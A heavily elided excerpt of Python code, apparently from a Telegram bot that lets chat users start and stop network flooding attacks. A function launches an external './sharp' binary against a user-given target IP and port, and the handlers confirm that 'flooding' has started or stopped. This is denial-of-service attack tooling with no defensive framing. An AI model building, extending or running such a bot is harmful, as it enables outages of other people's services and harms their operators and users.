...
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        process = subprocess.Popen(["./sharp", target_ip, str(target_port), "700", "20"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
...
def handle_start_attack(message):
    try:
        ...
        if attack_details:
            ...
            bot.send_message(chat_id, f"floding started♐♐.", parse_mode='Markdown')
        else:
...
def handle_stop_attack(message):
    try:
        ...
        if attack_details:
            ...
            bot.send_message(chat_id, f"Stop flooding 🛑", parse_mode='Markdown')
        else:
